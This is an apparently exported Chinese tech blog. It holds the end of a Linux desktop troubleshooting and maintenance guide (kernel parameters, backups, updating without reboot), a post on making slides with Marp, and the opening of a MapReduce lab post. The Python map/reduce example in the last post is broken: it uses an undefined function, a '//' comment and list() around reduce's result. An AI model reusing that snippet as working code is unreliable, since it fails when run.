<li>去<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvRG9jdW1lbnRhdGlvbi9hZG1pbi1ndWlkZS9rZXJuZWwtcGFyYW1ldGVycy50eHQ=">内核文档<i class="fa fa-external-link-alt"></i></span>里查一下, 其他几个选项分别是<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i8042.nopnp  [HW] Don&#x27;t use ACPIPnP / PnPBIOS to discover KBD/AUX具体</span><br><span class="line">           controllers</span><br><span class="line">        不使用ACPIPNP或可插拔BIOS模式发现KBD/AUX（Keyboard input driver，键盘输入驱动，Auxiliary，音频）可能是这个意思，我猜的</span><br><span class="line">i8042.notimeout  [HW] Ignore timeout condition signalled by controller</span><br><span class="line">        忽略超时</span><br><span class="line">i8042.reset  [HW] Reset the controller during init, cleanup and</span><br><span class="line">           suspend-to-ram transitions, only during s2r</span><br><span class="line">           transitions, or never reset</span><br><span class="line">        就是reset重置呗</span><br><span class="line">i8042.noloop  [HW] Disable the AUX Loopback command while probing</span><br><span class="line">           for the AUX port</span><br><span class="line">        禁用AUX回环？音频相关的东西，应该跟这个参数没关系</span><br></pre></td></tr></table></figure>
看起来起作用的应该是nopnp这个参数起作用了，去掉其他3个参数，试了一下就是它。</li>
<li>进一步查找根源问题和报告BUG的环节了。先去报BUG的那几个地方（Google搜出来都是launchpad怎么设置）用<code>nopnp</code>和<code>PnPBIOS</code>搜一下有没有相关的 Bug Report。在LKML邮件列表上可以找到这个：<span class="exturl" data-url="aHR0cHM6Ly9sa21sLm9yZy9sa21sLzIwMjAvMTAvMTMvNTU4">PS&#x2F;2 mouse not detected with ACPIPnP&#x2F;PnPBIOS<i class="fa fa-external-link-alt"></i></span> 这一串邮件已经找到了问题。<br>并且在2020.10.13在bugzilla已经发了<span class="exturl" data-url="aHR0cHM6Ly9idWd6aWxsYS5rZXJuZWwub3JnL3Nob3dfYnVnLmNnaT9pZD0yMDk2NTc=">PnP unable to detect connected PS&#x2F;2 mouse on Asus F2A85-M PRO<i class="fa fa-external-link-alt"></i></span><br>今年3月份的时候还给出了Patch，就等合并了。（更新，4月14号这个patched被defer）<br>行了，<span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMzMjM0NzYzMi9hbnN3ZXIvNzMyMzA3MDY4">我修了Linux内核的一个小bug，应该如何把它推进主线呢？ - 醉卧沙场的回答<i class="fa fa-external-link-alt"></i></span>教的东西也用不上了，就等合并吧…..</li>
</ol>
<h2 id="日常维护"><a href="#日常维护" class="headerlink" title="日常维护"></a>日常维护</h2><h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><blockquote>
<p>备份，然后重装</p>
</blockquote>
<p>如果硬盘或者u盘够大，推荐使用rsync或timeshift（其实也是调用的rsync或btrfs snapshot）<br>btrfs用户可以使用btrfs snapshots</p>
<p>备份硬盘不够大就只备份dotfiles等配置文件和个人资料就好了。</p>
<h3 id="谨慎进行危险操作"><a href="#谨慎进行危险操作" class="headerlink" title="谨慎进行危险操作"></a>谨慎进行危险操作</h3><p>一些可能会带来的操作尽量现在虚拟机、容器里面试一下。然而，能够意识到危险的东西一般不会把你坑了。</p>
<h3 id="dotfiles和脚本"><a href="#dotfiles和脚本" class="headerlink" title="dotfiles和脚本"></a>dotfiles和脚本</h3><p>经常换电脑或重装可以准备dotfiles和快速安装脚本</p>
<h3 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h3><p>桌面发行版如果没有暴露在外的公网IP和端口，应该不用担心。（毕竟桌面玩家大部分连个独显都没有，挖矿都榨不出油水（而且我简单不少Linux万家有钱了都叛逃Mac了））<br>不放心就用iptables&#x2F;nftables设置一下防火墙，设置一下用户和文件的权限；还不放心可以用clamav等工具扫一扫rookit。<br>虽然x11不少安全问题，桌面版sandbox隔离做的不好，可是这都不重要，你要小心的是流氓软件而不是所谓的CVE、0day。</p>
<p>Archlinux用户可以按照这个配置: <span class="exturl" data-url="aHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vVGgzV2hpdDNXb2xmLzJmMjRiMjkxODNiZTdmOGU5YzBiMDUxMTVhZWZiNjkz">Arch Secure Laptop Install<i class="fa fa-external-link-alt"></i></span> 对于一个桌面用户已经差不多了</p>
<h2 id="不想重启怎么办"><a href="#不想重启怎么办" class="headerlink" title="不想重启怎么办"></a>不想重启怎么办</h2><p>如果你用的是ArchLinux等滚动发行版，有不少更新是要重启后生效的。普通用户还是更新后重启一下比较好（这可能是最省心省力的）。<br>如果你不想重启，那也没问题。<br><strong>可能唯一不得不重启的就是内核更新了。</strong></p>
<h3 id="安装更新发生了什么"><a href="#安装更新发生了什么" class="headerlink" title="安装更新发生了什么"></a>安装更新发生了什么</h3><p>你可能听过这样的说法，Linux更新后的旧程序仍然跑在内存里，重启后才生效。可是内存不才一共就那么点？（啊，还有swap等交换区，那加起来也而不多）怎么装得下？ 实际上这些安装文件是（通常是）通过mmap建立虚拟地址映射，还在硬盘里。</p>
<p>在安装脚本和编译命令里面你会看到<code>install</code>这个命令，它跟<code>cp</code>命令最大的区别不是权限管理，而是更改前<code>unlink</code>。<br><code>cp</code>会把指定目录原有的文件删掉然后再将新的拷贝到指定目录，而当你有二进制文件在运行的时候，用<code>cp</code>更改这个二进制文件直接删会出错（可能<code>cp</code>命令报错<code>device or resource busy</code>执行失败，或<code>cp</code>执行成功但是导致正在运行的东西出现问题）。<br>而<code>install</code>会先<code>unlink</code>拷贝一个副本，很像Btrfs的COW（Copy on Write）机制，如果在用，原文件暂时保留（inode），新文件用新的inode，如果有程序在使用这个文件，在mmap映射中依然可以找到原文件（的inode）。虽然这个时候看起来你在安装目录原来的文件已经没了（<code>ls</code>命令查看<code>/usr/bin/XXX</code>、<code>/usr/lib/XXX</code>已经找不到旧文件了，只能看到新安装的），但是实际上在硬盘里还有副本（inode还在）。等到旧文件没有进程在用（refer,引用）之后（inode引用计数为0），旧文件才会被真正删掉；下次再引用的时候，就是新文件了。<br>（可以用<code>lsof /usr/bin/ssh</code>查看哪个进程在引用或读写<code>/usr/bin/ssh</code>这个文件）</p>
<p>普通的更新，无需重启整个系统。关闭应用或<code>kill</code>相关进程再打开应该就是新的了。</p>
<p>ps：不同文件系统的<code>cp</code>行为可能不一样（比如有COW的Btrfs和ZFS, 如果你启用了<code>reflink</code>参数）。不同<code>install</code>命令的实现可能也不一样。有些不太靠谱的安装使用<code>cp</code>命令更新二进制文件（比如Archlinux的AUR里某些野包），所以我喜欢刚开机的时候更新。</p>
<p>见：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC82Nzg5NDg3OA==">Linux中的mmap映射 [一]<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93ZWIuYXJjaGl2ZS5vcmcvd2ViLzIwMDkwNjI0MTA0NDQxL2h0dHA6Ly9lbi5jaHlzLmluZm8vMjAwOS8wNS9pbnN0YWxsLXZzLWNwLWFuZC1tbWFwLw==">install vs. cp; and mmap<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvQ29weS1vbi13cml0ZQ==">Copy-on-write<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuMi91bmxpbmsuMi5odG1s">unlink(2) — Linux manual page<i class="fa fa-external-link-alt"></i></span> 里的这段话：<br>If the name was the last link to a file but any processes still have the file open, the file will remain in existence until the last file descriptor referring to it is closed.</p>
<h3 id="不重启整个系统让更新生效"><a href="#不重启整个系统让更新生效" class="headerlink" title="不重启整个系统让更新生效"></a>不重启整个系统让更新生效</h3><p>普通的用户态的程序，直接重启这个程序就完了。<br>涉及到systemd daemon，<code>systemctl restart XXX</code><br>如果更新了<code>glibc</code>，那稍微麻烦一点, 这个东西影响比较多。至少要重启DE（Desktop Enviroment, 比如KDE）、systemd（已经你正在跑的daemon）、以及systemd依赖的dbus等等。（不推荐萌新尝试，很容易搞出问题，直接重启整个系统简单粗暴好用）<br>如果更新了<code>kernel module</code>，如果没生效试试手动<code>modprobe XXX</code>一下。</p>
<h3 id="内核更新不重启（暂时）"><a href="#内核更新不重启（暂时）" class="headerlink" title="内核更新不重启（暂时）"></a>内核更新不重启（暂时）</h3><p>这个括号里的<strong>暂时</strong>的意思是说，现在并没有很好的真·更新内核后不重启的办法（特别是Archlinux等滚动发行版）。下面要说到的<code>kexec</code>、<code>livepatch</code>等热更新都是用来修安全问题打补丁的（狂刷版本号的滚动更新请老老实实挑个空闲时间重启）。<br>如果想避免频繁更新内核之后的重启，请换用更新频率低的lts内核，比如非滚动升级的发行版（比如RH）。Arch可以用依云仙子的<code>linux-lily</code>，基本上半年更新一次（Arch的lts内核的更新频率并不低，甚至有些时候<code>linux-lts</code>比<code>linux</code>包版本号还高（前一段时间 5.10 lts 那会））。<br>如果你使用定制内核，部分模块（比如显卡驱动）推荐使用<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0R5bmFtaWNfS2VybmVsX01vZHVsZV9TdXBwb3J0">DKMS<i class="fa fa-external-link-alt"></i></span></p>
<p>一些给内核打热补丁的新技术，比如<span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3QvbGl2ZXBhdGNoL2xpdmVwYXRjaC5odG1s">livepatch<i class="fa fa-external-link-alt"></i></span>在<span class="exturl" data-url="aHR0cHM6Ly91YnVudHUuY29tL3NlY3VyaXR5L2xpdmVwYXRjaA==">Ubuntu等发行版已经支持了<i class="fa fa-external-link-alt"></i></span>，一定程度上减小了内核更新频率。很可惜更新内核频繁的Archlinux并没有默认启用，如果想自己打patch可以参考<span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0tlcm5lbF9saXZlX3BhdGNoaW5n">wiki<i class="fa fa-external-link-alt"></i></span>。很可惜Arch默认也不会像Debian&#x2F;Ubuntu的apt更新之后提示你是否应该重启，不过有个叫<code>needrestart</code>的包，会帮你在更新之后检查哪个 systemd daemon 需要更新。</p>
<p>之前讲调试kernel panic的时候提过<code>kexec</code>用于切换内核, 临时应付一下到下次关机可以用这个。如果嫌<code>kexec</code>麻烦可以试试下面这个：</p>
<p>在Archlinux上如果想在更新内核后临时使用旧内核到关机，可以用<code>kernel-modules-hook</code>这个包。注意，这个包会保留你原来的kernel在<code>/usr/lib/modules/</code>里面，要在重启时自动清理旧内核需要启动 systemd daemon： <code>systemctl enable linux-modules-cleanup</code></p>
<p>reddit版块有一个<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL2FyY2hsaW51eC9jb21tZW50cy9kMWxqMGEvaG93X2NvbWVfYXJjaF9saW51eF9jYW5fdXBncmFkZV90aGVfa2VybmVsLw==">讨论贴<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="个人体验和想说的话"><a href="#个人体验和想说的话" class="headerlink" title="个人体验和想说的话"></a>个人体验和想说的话</h2><h3 id="使用体验"><a href="#使用体验" class="headerlink" title="使用体验"></a>使用体验</h3><p>混成器（compositer）有OpenGL2、OpenGL3.1、xrender三个选项，混成器和显卡驱动设置不当经常会出一些小问题，比如Kwin屏幕撕裂、黑屏、卡死。如果你的鼠标卡住动不了了，可以在重启plasma之前禁用混成试试（默认的快捷键是Alt+Shift+F12）</p>
<p><img src="/linux-rescue/1618028977.png"></p>
<p>对于混成器感兴趣可以看看fc老师的这篇博客：<span class="exturl" data-url="aHR0cHM6Ly9mYXJzZWVyZmMubWUvemhzL2JyaWVmLWhpc3Rvcnktb2YtY29tcG9zaXRvcnMtaW4tZGVza3RvcC1vcy5odG1s">桌面系统的混成器简史<i class="fa fa-external-link-alt"></i></span>，不过现在2021年了，wayland还是。。。</p>
<p>如果你用Nivida，或者KDE，或者除了gdm以外的其他dm,不太推荐wayland。如果你喜欢触控板和GNOME,可以试试。<br>KDE用户可以考虑关闭baloo（这是一个搜索工具，然而经常出现内存占用飙升、CPU 100%）</p>
<blockquote>
<p>如果你使用 <span class="exturl" data-url="aHR0cHM6Ly9hcmNobGludXgub3JnL3BhY2thZ2VzLz9uYW1lPXF0NWN0">qt5ct<i class="fa fa-external-link-alt"></i></span> 包，Qt5 设置工具将有可能覆盖系用设置内的字体设置。</p>
</blockquote>
<p>小白用户可能还是适合Windows，如果用Linux就老老实实默认设置，不要为了好看去照着不知道哪来的教程做一些自己也不知道干了什么的美化。<br>如果真想入坑定制和美化，不妨去reddit的 Unix Porn 看看。<br>休眠设置不当经常导致很多问题，swap和zram要仔细配置<br>显卡驱动是万恶之源，Nvidia Fuck you！<br>使用wayland基本就是灵车漂移<br>使用pipewire也是<br>btrfs曾经是灵车，现在不是生产环境个人使用感觉还行（请善用snapshots备份）<br>虽然只用过2个月的Manjaro，然而出问题的次数比我用了一年Arch还多。<br>用CentOS是不可能用CentOS的，用windows都不可能用CentOS的。</p>
<h3 id="一些闲话"><a href="#一些闲话" class="headerlink" title="一些闲话"></a>一些闲话</h3><p>Linux用户包括Linux做主力的桌面玩家，靠这个吃饭的服务器运维或者网管，驱动和嵌入式开发们、红帽和Canonical…..当然更多的人只是偶尔连上去服务器的或者有一台不常用的桌面系统（一般是Ubuntu，还是wsl、跑在虚拟机里的那种）。最早我接触Linux的时候，是本科那会，基本都是arm的板子，调试串口写点驱动…桌面发行版就一个Ubuntu16扔在虚拟机里除了干活没打开过几次。当时还要频繁的用protel画pcb、stm32套件，用word应付乱七八糟的实验报告，根本没想到有一天会将Linux作为主力桌面系统。<br>余生也晚，据说曾经的Linux中文论坛和社区人声鼎沸，现在都随着irc、bbs时代一起没落了；然而现在Linux等话题下面充斥着活跃的是营销号、卖书的、卖课的、忽悠考证的，还有Linux中国之类的垃圾机翻，以及无数的伸手党。<br>ps：最近老男孩抄袭spug运维的事又闹得沸沸扬扬的，某些卖课培训班的德行，啧啧。本来是想兼谈服务器的，毕竟在大多数人眼里这才是“正事”，“桌面”那属于不务正业浪费时间瞎折腾。让他们卖课噶韭菜用CentOS的人看抄了无数遍的N手老资料去吧。<br>都说到这了，<span class="exturl" data-url="aHR0cHM6Ly9jZW50b3MucmlwLw==">给CentOS上个香<i class="fa fa-external-link-alt"></i></span>再走吧。</p>
<p>相比于Linux&#x2F;Unix在服务器上几年不关机稳如狗的表现，桌面环境和应用的崩溃和卡死是司空见惯的事，，毕竟用爱发电的开源拖拉机没那么多人手和资金用在测试和GUI体验上，<strong>要习惯，不要大惊小怪，也不要死机了就一言不合重启重装</strong>（或者你可以去用wm或者在termial下面用Vim等终端工具生活）</p>
<p>现在的Linux桌面和软件已经比以前完善、漂亮、稳定多了，我个人比较看好KDE，当然。<br>大部分情况下导致桌面卡死的就那么几个东西，比如vscode内存泄漏，比如baloo，比如pipewire和pulseaudio，比如某些Wine的软件。</p>
<h2 id="参考和推荐阅读"><a href="#参考和推荐阅读" class="headerlink" title="参考和推荐阅读"></a>参考和推荐阅读</h2><p><span class="exturl" data-url="aHR0cHM6Ly94aWFveWVzaGl5dS5naXRodWIuaW8vbGludXgvZmFlLzIwMTcvMDUvMTEvJUU1JUFFJTlFJUU0JUJFJThCJUU0JUJEJUJGJUU3JTk0JUE4Y3Jhc2glRTUlODglODYlRTYlOUUlOTBLZHVtcCVFOCVCRCVBQyVFNSU4MiVBOGtlcm5lbCVFNSVCNCVBOSVFNiVCQSU4MyVFNSU4NiU4NSVFNiVBMCVCOC8=">https://xiaoyeshiyu.github.io/linux/fae/2017/05/11/实例使用crash分析Kdump转储kernel崩溃内核/<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly90aG9tYXNrLnNkZi5vcmcvYmxvZy8yMDE5LzExLzA5L3Rha2UtY2FyZS1lZGl0aW5nLWJhc2gtc2NyaXB0cy5odG1s">https://thomask.sdf.org/blog/2019/11/09/take-care-editing-bash-scripts.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9uZXdzLnljb21iaW5hdG9yLmNvbS9pdGVtP2lkPTIzMDg3MzA4">https://news.ycombinator.com/item?id=23087308<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTA0MTIyNjA5NTY1NzAz">https://juejin.cn/post/6844904122609565703<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0tkdW1w">https://wiki.archlinux.org/index.php/Kdump<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cDovL3d3dy5icmVuZGFuZ3JlZ2cuY29tL2xpbnV4cGVyZi5odG1s">http://www.brendangregg.com/linuxperf.html<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvTWFnaWNfU3lzUnFfa2V5">https://en.wikipedia.org/wiki/Magic_SysRq_key<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0dlbmVyYWxfdHJvdWJsZXNob290aW5n">https://wiki.archlinux.org/index.php/General_troubleshooting<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93d3cua2VybmVsLm9yZy9kb2MvaHRtbC9sYXRlc3Qv">The Linux Kernel documentation<i class="fa fa-external-link-alt"></i></span> 网上搜不到的解决办法时候再去查文档</p>
<p>ArchLinux相关：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwLy9HZW5lcmFsX3JlY29tbWVuZGF0aW9uc18oJUU3JUFFJTgwJUU0JUJEJTkzJUU0JUI4JUFEJUU2JTk2JTg3KQ==">ArchWiki: General recommendations (简体中文)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0dlbmVyYWxfdHJvdWJsZXNob290aW5n">ArchWiki: General troubleshooting<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0RlYnVnXy1fR2V0dGluZ19UcmFjZXM=">ArchWiki Debug - Getting Traces<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvaW5kZXgucGhwL0J1Z19yZXBvcnRpbmdfZ3VpZGVsaW5lcw==">ArchWiki Bug reporting guidelines<i class="fa fa-external-link-alt"></i></span>  </p>
<p>安全相关：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93aWtpLmFyY2hsaW51eC5vcmcvdGl0bGUvU2VjdXJpdHlfKCVFNyVBRSU4MCVFNCVCRCU5MyVFNCVCOCVBRCVFNiU5NiU4Nyk=">Security (简体中文)<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ltdGhlbmFjaG9tYW4vSG93LVRvLVNlY3VyZS1BLUxpbnV4LVNlcnZlciNkaXNhYmxlLXJvb3QtbG9naW4=">How-To-Secure-A-Linux-Server<i class="fa fa-external-link-alt"></i></span>  </p>
<h3 id="喜欢折腾且有时间可以看看这些"><a href="#喜欢折腾且有时间可以看看这些" class="headerlink" title="喜欢折腾且有时间可以看看这些"></a>喜欢折腾且有时间可以看看这些</h3><p><span class="exturl" data-url="aHR0cDovL3d3dy5saW51eGZyb21zY3JhdGNoLm9yZy9sZnMvdmlldy9zdGFibGUv">Linux From Scratch<i class="fa fa-external-link-alt"></i></span> 著名的LFS，教你从头编译，照着教程来不难，需要一点耐心和性能足够好的机器用来编译。这有个<span class="exturl" data-url="aHR0cHM6Ly9sY3R0LmdpdGh1Yi5pby9MRlMtQk9PSy9sZnMtc3lzdi9MRlMtQk9PSy5odG1s">中文翻译<i class="fa fa-external-link-alt"></i></span>可以参考。<br><span class="exturl" data-url="aHR0cHM6Ly9ib290bGluLmNvbS9kb2MvbGVnYWN5L2VsZnMvZW1iZWRkZWRfbGZzLnBkZg==">Embedded Linux From Scratch<i class="fa fa-external-link-alt"></i></span> bootlin的嵌入式Linux教程，略老<br><span class="exturl" data-url="aHR0cHM6Ly9yaXNjdi5vcmcvbmV3cy8yMDIwLzEyL2VtYmVkZGVkLWxpbnV4LWZyb20tc2NyYXRjaC1pbi00NS1taW51dGVzLW9uLXJpc2Mtdi1ib290bGluLw==">Embedded Linux “from scratch” in 45 minutes…on RISC-V | Bootlin<i class="fa fa-external-link-alt"></i></span> 貌似现在流行risc-v和Rust写嵌入式的东西，老了，没玩过。<br><span class="exturl" data-url="aHR0cHM6Ly9lbGl4aXIuYm9vdGxpbi5jb20vbGludXgvbGF0ZXN0L3NvdXJjZQ==">Elixir Cross Referencer<i class="fa fa-external-link-alt"></i></span> 还是bootlin的，能在线查看Linux源码<br><span class="exturl" data-url="aHR0cHM6Ly93d3cuY29kZWR1bXAuaW5mby9wb3N0LzIwMjAwMTI4LXN5c3RlbXRhcC1ieS1leGFtcGxlLw==">通过实例快速入门Systemtap<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xpY2h1YW5nL2F3ZXNvbWUtc3lzdGVtdGFwLWNu">awesome-systemtap-cn<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLm9wZW5yZXN0eS5jb20uY24vY24vZHluYW1pYy10cmFjaW5nLw==">动态追踪技术漫谈<i class="fa fa-external-link-alt"></i></span> 强烈推荐<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby9lbmcvMjAxNi8wNi8yMi9tb25pdG9yaW5nLXR1bmluZy1saW51eC1uZXR3b3JraW5nLXN0YWNrLXJlY2VpdmluZy1kYXRhLyM=">Monitoring and Tuning the Linux Networking Stack: Receiving Data<i class="fa fa-external-link-alt"></i></span><br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnBhY2thZ2VjbG91ZC5pby9lbmcvMjAxNy8wMi8wNi9tb25pdG9yaW5nLXR1bmluZy1saW51eC1uZXR3b3JraW5nLXN0YWNrLXNlbmRpbmctZGF0YS8=">Monitoring and Tuning the Linux Networking Stack: Sending Data<i class="fa fa-external-link-alt"></i></span> 这两篇是讲网络栈监控和调优的，经典文章。流传很广，也有很多中文翻译，不过原文直白简练，推荐直接看原文  </p>
<p><span class="exturl" data-url="aHR0cHM6Ly9jYXRjYXQuY2MvcG9zdC8yMDIwLTEwLTMxLw==">Linux fontconfig 的字体匹配机制<i class="fa fa-external-link-alt"></i></span>  对字体有疑问的强烈推荐阅读<br><span class="exturl" data-url="aHR0cHM6Ly9jYXRjYXQuY2MvcG9zdC8yMDIxLTAzLTA3Lw==">用 fontconfig 治理 Linux 中的字体<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <categories>
        <category>Linux&amp;Unix</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>rescue</tag>
      </tags>
  </entry>
  <entry>
    <title>用Markdown制做PPT</title>
    <url>/make-ppt-with-markdown/</url>
    <content><![CDATA[<p>纯文本好，富文本坏。这是一个劝你放弃PowerPoint和Wps演示的安利文，回归简陋，回归开源。</p>
<span id="more"></span>

<p>这是迫于毕业不得不向PPT低头才干出来的事情，在PPT上浪费时光真没意思。能不做PPT还是不做PPT最好。（没推荐Beamer是因为LaTeX这种专业排版工具还是太复杂了，还是会浪费不少时间在排版上。）</p>
<h2 id="喧宾夺主的PPT"><a href="#喧宾夺主的PPT" class="headerlink" title="喧宾夺主的PPT"></a>喧宾夺主的PPT</h2><p><del>但是根据约翰霍普金斯大学的研究，喜欢做PPT的大概率是个传销分子</del></p>
<p>Office三件套里面，我对word只是喜欢不起来（真要做到内容样式分离还是可以的，而且把富文本的所见即所得做到了地表最强），对Excel有点厌恶（谁让你多管闲事把身份者号给我改成科学计数法了？），PPT我真的心力憔悴了。Beamer一类的Slides演示还比较重视内容，你软家的</p>
<p>如果不是生活所迫谁愿意做PPT呢，直接拿Markdown写文档呗。（我们现在确实除了毕业答辩这种迫不得已的事情，都用Markdown给老板讲东西了。PPT？当年老板嫌弃小胡师兄PPT做的烂，反正PPT不好好做看起来甚至不如Markdown在typora里面或者hexo里面好看）。好在毕业答辩类的学术PPT不用做的太好看，简陋一点反而显得比较朴实无华，Markdown生成的PPT也够看了。而且我前期给老板交差的调研材料什么的基本都是用Markdown写的，改一改就成PPT了。其实如果不是开题、毕设答辩要求PPT，我真的想用Markdown列一个大纲讲。</p>
<p>至于为什么不用LaTeX的Beamer，那是我对LaTeX不熟，而我对CSS和HTML比较熟，Markdown做不到的可以伤感CSS魔改。<br>功能简陋也好，这样免得我在PPT上面调格式浪费很多时间。<strong>而且可以用键盘操作</strong>。</p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>作为一个毕业答辩之类的PPT，Marp的功能已经足够做一个丐版的学术简陋风格PPT了，Beamer的功能Marp几乎都有。这个东西有VSCode插件，直接装就好了。网页版也可以直接用。</p>
<p>当然这个东西没有什么惊艳的动画效果和对布局细致的控制和调整，Markdown本来就不适合干这个事情呢。如果是做传销风格的PPT那还请<del>直接用Office</del>试试隔壁的reveal.js，像写前端一样写你的演示，各种漂亮的动画效果全都有。</p>
<p>直接新建一个Markdown，在开头启用marp就好了。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line"><span class="section">marp: true</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure>

<p>语法都是markdown的语法，每一张PPT之间隔断就用<code>---</code>就可以了（最好在<code>---</code>前面空一行）</p>
<p>为了更符合传统的PPT界面的布局，VSCode打开Preview，然后将preview调到左边侧栏。好，它现在看起来和wps演示和PowerPoint完全一致。</p>
<p><img src="/make-ppt-with-markdown/1641736904.png"></p>
<h2 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h2><p>图片的支持当然没有PowerPoint那么好。Markdown本来就不支持调整图片的大小、图片缩放、指定图片位置这种操作。对于博客文章或者文档可以统一用css去设置居中、边框这些，但是PPT的图片几乎每页的布局和位置都不太一样。Marp对Markdown提供了一些扩展，能基本满足我对图片的位置调整需求。如果不满足要求可以用html标签去调图片。</p>
<p>下面的操作是一些粗略调整宽度高度的语法、以及上下左右、居中、背景图片。</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">bg right vertical weight:600</span>](<span class="link">zhixi.png</span>)</span><br><span class="line">&lt;!-- 将图片置于右上，宽度600px --&gt;</span><br></pre></td></tr></table></figure>

<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><p>Marp自带的模板合适可以自己定制，只需要一点CSS就可以了</p>
<p>定制可以参考：<span class="exturl" data-url="aHR0cHM6Ly9tYXJwaXQubWFycC5hcHAvdGhlbWUtY3Nz">https://marpit.marp.app/theme-css<i class="fa fa-external-link-alt"></i></span></p>
<p>太长不看版：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcnAtdGVhbS9tYXJwL2Rpc2N1c3Npb25zLzExNQ==">How to create a theme?<i class="fa fa-external-link-alt"></i></span>  </p>
]]></content>
      <tags>
        <tag>ppt</tag>
        <tag>markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>6.824 Lab1 MapReduce 经典老番</title>
    <url>/map-reduce/</url>
    <content><![CDATA[<p>Long Live Map Reduce</p>
<span id="more"></span>

<p>MapReduce的影响挺大的</p>
<h2 id="Map和Reduce操作"><a href="#Map和Reduce操作" class="headerlink" title="Map和Reduce操作"></a>Map和Reduce操作</h2><p>MapReduce 最早是函数式编程里的概念，我一开始也是在python里面最听到这两个词的。map用来映射，reduce用来聚合。</p>
<p>python里面是这样的：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f1</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> x*x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">f2</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> x*y</span><br><span class="line"></span><br><span class="line">nums = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span> ,<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">suqare = <span class="built_in">list</span>(<span class="built_in">map</span>(f, nums))</span><br><span class="line">//reduce作用于一个序列，效果相当于阶乘</span><br><span class="line">factorial = <span class="built_in">list</span>(reduce(f2, nums))</span><br></pre></td></tr></table></figure>

<p>求阶乘的操作用循环也可以做到，但是我们注意到这些操作有很好的性质，可以分离开计算再求总和，这样就可以拆解为一些小的并行计算。（循环也可以被SIMD指令并行，这里先不多说了）</p>
<p>遍历使用迭代器完成的</p>
<h2 id="分布式的MapReduce"><a href="#分布式的MapReduce" class="headerlink" title="分布式的MapReduce"></a>分布式的MapReduce</h2><p><img src="/map-reduce/1647509929.png"></p>
<p>Map和Reduce两种操作和上面python的例子用法一样</p>
<p><img src="/map-reduce/1647509989.png"></p>
